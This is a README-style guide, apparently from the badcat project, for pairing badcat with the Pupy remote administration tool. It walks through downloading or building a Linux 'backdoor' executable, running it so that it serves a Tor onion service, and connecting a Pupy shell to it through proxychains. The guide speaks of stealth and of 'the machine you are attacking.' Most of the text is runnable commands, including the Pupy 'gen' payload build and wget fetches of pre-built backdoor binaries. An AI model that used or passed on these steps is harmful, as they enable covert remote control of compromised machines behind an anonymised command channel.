# Pupy - Proof of Concept

Badcat is a reasonably good tool, but one generally needs to perform many actions through a backdoor, then using badcat as-is will eventually get you into issues. For instance, one needs to perform an upload or download of files, badcat can't help you with that.

I decided to integrate badcat functionality with some existing RAT (Remote Administration Tool).

I chose pupy, among other reasons, because I failed to make it work with others (Poshc2) and because it seemed to fit better than the alternatives, like good coding design, modularity, awesome hidding techniques - something badcat lacks.

# Common Concerns

_What works for now?_

**R: This is a Proof of Concept and works in Linux only. Every RPC related stuff from Pupy works out of the box. Pupy process migration is disabled for now, so when you run the program it keeps in the foreground and in the same process - this details matters when you want to be stealth, but for now just ignore it.**

_Will it work on my machine?_

**R: Probably not, you should test it out though. I tested with a virtual machine running Fedora 34 and podman for containers. For a bunch of reasons I will ignore here, running the _backdoor_ just works in a specific environment, because of that I execute inside a container. Running Pupy, on the other hand, should work fine on any other Linux distro, but I only tested on Fedora.**

_I don't care about how everything works, can't I just test it out?_

**R: Of course you can. Follow this [steps](#quick-start). Although I always recommend to take a look to understand what is going on under the hood.**

_Will badcat work with any other RAT?_

**R: Probably, yes. By now it would require advanced skills and lots of time for debugging, as it was to integrate with Pupy. To measure, it took me around a month for a proof of concept.**

_Now, will badcat support any other RAT?_

**R: Probably, not. I'll try my best to fully support at least one RAT of my choice, for now Pupy. If one wants support for other RATs, one should either ask support from RAT's developers or try to write the integration code by your own. The whole community would thank you for that.**

_I hate your integration design choices, can I help you?_

**R: Why haven't you told me before? Of course you can. Fill up an Issue or send a Pull Request. I'm terrible at coding and do not know how it worked, it just works.**

# Quick Start

You just want to test to see if it works, I get it. So each step will not contain many explainations.

_Note: one may replace podman with docker, the cli syntax is exactly the same._

## 1. Clone Pupy

Clone the project recursively (as stated [here](https://github.com/n1nj4sec/pupy/wiki/Installation#pupy-setup)).

```bash
git clone --recursive https://github.com/yanmarques/pupy.git
```

## 2. Run the Simulation Environment

I only tested with this container, so proceed as following: 

```bash
cd ./pupy/
podman build -t pupy-local -f ./client/Dockerfile .
podman run -it pupy-local bash 
```

The above commands will leave you inside an interactive shell inside the container.

## 3. Download and Run Pre-Built Binaries in the Container

I gently provided pre-built binaries, the `backdoor` executable and badcat shared library. **Inside the container**, download them with:

```bash
wget https://github.com/yanmarques/badcat/raw/dev/test-pupy/resources/backdoor
wget https://github.com/yanmarques/badcat/raw/dev/test-pupy/resources/libbadcat_pupy.so
```

Then run the _backdoor_ with:

```bash
LD_LIBRARY_PATH=. ./backdoor
```

Once the server is up and running, you need to connect through Tor using Pupy. In order to discover the generated Onion Service hostname, discover the container ID then run the following command (replace CONTAINER_ID with the discovered container ID):

```bash
podman exec CONTAINER_ID cat hidden-service/hostname
```

The output should be an onion address, I'll use the following address as example `ithahibo6xgtlieneq5suimjxynpmjbircpf3q54ier5fkfpwiffvxyd.onion`.

**The next steps are executed in your machine, not the container. The container just run the _backdoor_.** 

## 4. Install Pupy Python 2.7 Deps

Ensure Pip is installed for your Python 2.7 with:

```bash
wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
python2 get-pip.py
```

Then install `swig`:

```bash
dnf install -y swig
```

Finally install Python dependencies:

```bash
cd ./pupy/pupy
python2 -m pip install -r requirements.txt
```

## 3. Spawn a Session to Pupy

Now you connect to the server through Tor. Follow [this](https://itigic.com/use-proxychains-and-tor-on-linux-to-be-anonymous/) article to have Tor and `proxychains` installed and configured. Then run the following command to start Pupy shell:

```bash
cd ./pupy/pupy
proxychains python2 pupysh.py
```

A prompt will be displayed. Type the connect command like the following replacing the onion address with the one you discovered earlier (yes, use the hardcoded port 8000):

```bash
>> connect -c ithahibo6xgtlieneq5suimjxynpmjbircpf3q54ier5fkfpwiffvxyd.onion:8000 -t tcp_cleartext
```

Now be patient! 

Generally it take around a minute to start a full session, it depends on your connection, Tor's network latency at the moment and so on. For me it has already took more than five minutes to start a full session. So again, be patient.

Once the full session has started, one may see the following:

![Pupy shell connection from badcat integration](https://user-images.githubusercontent.com/28604565/148860949-71ab11ee-3d91-4342-82c6-ac96d5d75077.png)

# Build From Source

For my own anottation purpose and for the ones looking for how to build all tools from source, the next steps describes the how to.

## 1. Clone Pupy

The official Pupy project can not run badcat without modification in the Linux client source code. So I fork the official project and make the necessary changes. My fork is [here](https://github.com/yanmarques/pupy), I recommend you to check the latest commits to see what are such modifications.

That being said, clone the project recursively (as stated [here](https://github.com/n1nj4sec/pupy/wiki/Installation#pupy-setup)).

```bash
git clone --recursive https://github.com/yanmarques/pupy.git
```

## 2. Build The Container Image

Unfortunately, again, the official Pupy container image has a different `libc` version than the machine I used to build badcat integration code. Either I build badcat integration code in another machine or container, or re-create Pupy official container with the required `libc` version. I chose the later because I would have more control over the environment.

Then, build the image from my Dockerfile:

```bash
cd ./pupy/
docker build -t pupy-local -f ./client/Dockerfile . 
```

## 3. Install Pupy Python 2.7 Deps

Pupy relies on Python 2.7 yet, so one must have such package installed. In order to install dependencies, ensure Pip is installed for your Python 2.7. One can install Pip with:

```bash
wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
python2 get-pip.py
```

Then install `swig`, required to build some Python dependency:

```bash
dnf install -y swig
```

Finally install Python dependencies:

```bash
cd ./pupy/pupy
python2 -m pip install -r requirements.txt
```

## 4. Build Badcat's Pupy Integration

First, follow badcat toolchain installation [here](https://github.com/yanmarques/badcat/tree/dev#getting-started) if you have not installed before. Then make sure you are at the `dev` branch and fully updated:

```bash
git checkout dev
git pull
```

Before building the integration code, think about your objectives. By default (at [this](https://github.com/yanmarques/badcat/blob/102452990e4364f67f4ecd17b1c4f802057f62c2/test-pupy/src/lib.rs#L98) line of code), badcat integration will start Tor with Tor's default `DataDirectory` and the `HiddenServiceDir` set to `hidden-service` directory. Modify the parameters to fit your desires.

Then build it:

```bash
cargo build --release -p test-pupy
```

An ELF shared library will be generated at `./target/release/libbadcat_pupy.so`, check the following:

```bash
$ file ./target/release/libbadcat_pupy.so 
./target/release/libbadcat_pupy.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=44e952dde4ea235d5683a8289ef4d39da0097e5c, with debug_info, not stripped
```

This ELF shared library file is extremely important, it holds Tor and badcat code. Such file must be copied to two places:

1. The directory where Pupy will be built. As you may already know, Pupy first build the executable (elf, exe, apk, etc) with a dummy string to be replaced with actual Python code later. This such build will be our next step.
2. Where you will run the resulting executable. As you may already know, the executable needs the shared library to run, remember this is a PoC, ideally it should not need to carry the shared library to everywhere you need to run.

Sooo, copy the `libbadcat_pupy.so` shared library to `pupy/client/sources-linux`.

## 5. Build Pupy Linux Executable

In order to generate the required executables, change your current working directory to the top level directory of Pupy project (`pupy`). Then run (if you use docker, just replace `podman` with `docker`):

```bash
podman run --mount type=bind,src=$(pwd),target=/build/workspace/project pupy-local ./client/sources-linux/build-docker.sh
```

It take some time to finish, but as soon as it has finished, one should see a `[+] Build complete` message. If can check the directory `pupy/pupy/payload_templates` for generated executable templates. There is an issue - because I'm not following Pupy documentation of how to run it - with the generated linux template, that the template name misses a `x64` and one must fix it. To fix it, run the following command:

**Note: one must replace the old template whenever a new build is run**

```bash
cp ./pupy/payload_templates/pupy.lin ./pupy/payload_templates/pupyx64.lin
```

## 6. Build the Pupy Payload

In order to generate the resulting executable with the payload, change your current working directory to the pupy source (`pupy/pupy`). Then enter inside the Pupy shell with the following command:

```bash
python2 pupysh.py
```

You should see something like this:

![Pupy shell screenshot](https://user-images.githubusercontent.com/28604565/148851208-0213fd43-550d-44c9-86ba-f54d3ed174c4.png)

Finally, build the payload:

```bash
>> gen -O linux -A x64 -o backdoor bind --port 8000 -t badcat
```

The resulting executable is at `./pupy/pupy/backdoor`. To fully test Pupy with badcat functionality, you need this `backdoor` executable, the integration shared library and the Pupy shell of course.

## 7. Start a Pupy Session with badcat

First things first, prepare the machine you are attacking. This machine must have some weird libraries installed, with boring versions. So the best way I found was to use the container image, the one created early under the name of `pupy-local`, derived from a Dockerfile I wrote myself.

I started a container with an interactive shell and a mount for accessing the executable (`backdoor`) and the integration shared library (`libbadcat_pupy.so`) using the following command:

```bash
podman run --mount type=bind,src=$(pwd),target=/project -it pupy-local bash
```

Inside the container, access the directory with both files, in my case here is at the mountpoint `/project`. Then run the executable providing the directory where the shared library is located, so it is found in runtime. In my case, the shared library was in the same directory, so a dot (`.`) is used there.

```bash
LD_LIBRARY_PATH=. ./backdoor
```

Once the server is up and running, you need to connect through Tor using Pupy. In order to discover the generated Onion Service hostname, check on your current working directory the contents of the file at `hidden-service/hostname`. For instance, my server is:

```bash
$ cat ./hidden-service/hostname
ithahibo6xgtlieneq5suimjxynpmjbircpf3q54ier5fkfpwiffvxyd.onion
```

The next step is to connect to server using Pupy. First exit the Pupy shell if you are already in. Then install `tor` and `proxychains` if do not have them already. The idea is to have Tor client running and use `proxychains` to force all Pupy shell connections to travel Tor proxy. If you are not certain of how to configure Tor and `proxychains`, check [this](https://itigic.com/use-proxychains-and-tor-on-linux-to-be-anonymous/) article.

Once Tor is running and `proxychains` is configure to use Tor Socks proxy, start Pupy shell and connect to your Onion Service:

```bash
proxychains python2 pupysh.py
>> connect -c ithahibo6xgtlieneq5suimjxynpmjbircpf3q54ier5fkfpwiffvxyd.onion:8000 -t tcp_cleartext
```

Now be patient! 

Generally it take around a minute to start a full session, it depends on your connection, Tor's network latency at the moment and so on. For me it has already took more than five minutes to start a full session. So again, be patient.

Once the full session has started, one may see the following:

![Pupy shell connection from badcat integration](https://user-images.githubusercontent.com/28604565/148860949-71ab11ee-3d91-4342-82c6-ac96d5d75077.png)

# Integration

This topic tries to explain how Pupy talks to Tor Onion Service connections, supported by badcat. In case you don't know yet, see the following links:
- [Pupy](https://github.com/n1nj4sec/pupy)
- [Tor Onion Service](https://community.torproject.org/onion-services/)
- [Tor Streaming Interface](https://github.com/yanmarques/badcat/blob/dev/docs/Tor.md#tor-streaming-interface)